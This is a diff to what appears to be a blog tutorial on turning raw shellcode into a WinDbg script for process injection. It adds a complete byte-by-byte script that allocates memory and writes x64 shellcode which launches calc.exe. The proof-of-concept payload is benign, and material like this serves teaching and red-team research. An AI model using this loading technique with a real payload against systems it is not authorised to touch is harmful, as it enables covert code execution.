@@ -45,7 +45,9 @@ def convert_binary_file(input_file_path):
 
         with open(input_file_path, 'rb') as binary_file, open('shellcode.wds', 'w') as output_file:
             # write allocation instructions
+            {% raw %}
             output_file.write(f".foreach /pS 5 ( register {{ .dvalloc 0x{file_size:X} }} ) {{ r @$t0 = register }}\n")
+            {% endraw %}
 
             # write shellcode bytes
             byte = binary_file.read(1)
@@ -82,6 +84,39 @@ if __name__ == "__main__":
     else:
         convert_binary_file(sys.argv[1])
         print("Results written to shellcode.wds")
+```
+
+Shellcode that pops calc.exe would look something like this:
+
+```
+.foreach /pS 5 ( register \{ .dvalloc 0x6B \} ) { r @$t0 = register }
+;eb @$t0+00 53 ;eb @$t0+01 56 ;eb @$t0+02 57 ;eb @$t0+03 55
+;eb @$t0+04 54 ;eb @$t0+05 58 ;eb @$t0+06 66 ;eb @$t0+07 83
+;eb @$t0+08 E4 ;eb @$t0+09 F0 ;eb @$t0+0A 50 ;eb @$t0+0B 6A
+;eb @$t0+0C 60 ;eb @$t0+0D 5A ;eb @$t0+0E 68 ;eb @$t0+0F 63
+;eb @$t0+10 61 ;eb @$t0+11 6C ;eb @$t0+12 63 ;eb @$t0+13 54
+;eb @$t0+14 59 ;eb @$t0+15 48 ;eb @$t0+16 29 ;eb @$t0+17 D4
+;eb @$t0+18 65 ;eb @$t0+19 48 ;eb @$t0+1A 8B ;eb @$t0+1B 32
+;eb @$t0+1C 48 ;eb @$t0+1D 8B ;eb @$t0+1E 76 ;eb @$t0+1F 18
+;eb @$t0+20 48 ;eb @$t0+21 8B ;eb @$t0+22 76 ;eb @$t0+23 10
+;eb @$t0+24 48 ;eb @$t0+25 AD ;eb @$t0+26 48 ;eb @$t0+27 8B
+;eb @$t0+28 30 ;eb @$t0+29 48 ;eb @$t0+2A 8B ;eb @$t0+2B 7E
+;eb @$t0+2C 30 ;eb @$t0+2D 03 ;eb @$t0+2E 57 ;eb @$t0+2F 3C
+;eb @$t0+30 8B ;eb @$t0+31 5C ;eb @$t0+32 17 ;eb @$t0+33 28
+;eb @$t0+34 8B ;eb @$t0+35 74 ;eb @$t0+36 1F ;eb @$t0+37 20
+;eb @$t0+38 48 ;eb @$t0+39 01 ;eb @$t0+3A FE ;eb @$t0+3B 8B
+;eb @$t0+3C 54 ;eb @$t0+3D 1F ;eb @$t0+3E 24 ;eb @$t0+3F 0F
+;eb @$t0+40 B7 ;eb @$t0+41 2C ;eb @$t0+42 17 ;eb @$t0+43 8D
+;eb @$t0+44 52 ;eb @$t0+45 02 ;eb @$t0+46 AD ;eb @$t0+47 81
+;eb @$t0+48 3C ;eb @$t0+49 07 ;eb @$t0+4A 57 ;eb @$t0+4B 69
+;eb @$t0+4C 6E ;eb @$t0+4D 45 ;eb @$t0+4E 75 ;eb @$t0+4F EF
+;eb @$t0+50 8B ;eb @$t0+51 74 ;eb @$t0+52 1F ;eb @$t0+53 1C
+;eb @$t0+54 48 ;eb @$t0+55 01 ;eb @$t0+56 FE ;eb @$t0+57 8B
+;eb @$t0+58 34 ;eb @$t0+59 AE ;eb @$t0+5A 48 ;eb @$t0+5B 01
+;eb @$t0+5C F7 ;eb @$t0+5D 99 ;eb @$t0+5E FF ;eb @$t0+5F D7
+;eb @$t0+60 48 ;eb @$t0+61 83 ;eb @$t0+62 C4 ;eb @$t0+63 68
+;eb @$t0+64 5C ;eb @$t0+65 5D ;eb @$t0+66 5F ;eb @$t0+67 5E
+;eb @$t0+68 5B ;eb @$t0+69 C3
 ```
 
 ### 4. Performing remote process injection
